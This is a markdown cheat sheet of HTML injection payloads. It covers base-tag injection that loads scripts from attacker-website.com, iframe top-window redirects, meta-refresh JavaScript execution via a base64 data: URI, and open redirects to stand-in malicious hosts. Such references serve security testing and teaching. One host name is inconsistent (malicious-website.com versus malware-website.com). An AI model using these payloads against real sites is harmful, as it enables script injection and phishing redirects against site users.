# HTMLi
HTML Injection Payloads

## base

The HTML 
 element specifies the base URL to use for all relative URLs in a document.
Note: If multiple <base> elements are used, only the first href and first target are obeyed — all others are ignored.

### Relative URL redirection
`<base>` tag injection allows you to redirect relative url to the attacker host. For example, if the vulnerable site includes a script:
```html
<script src="/assets/some-script.js"></script>
```

so, if you inject before the relative remote script:
```html
<base href="https://attacker-website.com">
```
the browser will request https://attacker-website.com/assets/some-script.js.

## iframe
The `<iframe>` tag is used to embed an HTML document in another HTML document. If source of inserted document located on another origin, same origin policy will block any access to content of other document for both of them.

### Open redirect
Child document can view and set location property for parent, even if cross-origin top.window.location.
Inject an iframe to vulnerable-website.com:
```html
<iframe src=//malicious-website.com/toplevel.html></iframe>
```
where `https://malicious-website.com/toplevel.html` contains:
```html
<html><head></head><body><script>top.window.location = "https://malicious-website.com/pwned.html"</script></body></html>
```
When the iframe is loaded, the parent will be redirected to the https://malware-website.com/pwned.html page, even if the child document is loaded from a different origin. Same origin policy will be bypassed because the iframe is not being "sandboxed", q.v. .



## meta
The `<meta` tag represents metadata that cannot be represented by other HTML meta-related elements.
Some `<meta>` tags are informational, for example:
```html
<meta name="name" content="content">
```
And some affect the page in some way, for example:
```html
<meta http-equiv="content-security-policy" content="default-src 'none'; base-uri 'self'">
```
Moreover, CSP does not regulate such `<meta>` elements. `<meta http-equiv=...>` is a tag on the page that may emulate a subset of functions normally reserved for page headers. Similarly, some of these functions appear in Javascript, which is already heavily regulated by CSP. Dangerous functions that can be performed by `<meta http-equiv=...>` include:
⋅⋅* set-cookie,
..* refresh:
....* redirect to any regular URL,
....* redirect to any data: URL.

set-cookie instruction was removed from the standard, and is no longer supported at all in Firefox 68 and Chrome 65.

## XSS
We can use the <meta> tag with content = "0; data: " URI to execute arbitrary Javascript code (works only on safari), for example:
```html
<meta name="language" content="0;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" http-equiv="refresh"/>
```
Firefox and Chrome will block this:
Not allowed to navigate top frame to data URL (Firefox)

    Navigation to toplevel data: URI not allowed (Chrome)

### Open redirect
Using a similar payload, you can redirect the victim to an malicious page:
```html
<meta name="language" content="5;http://malicious-website.com" http-equiv="refresh"/>
```
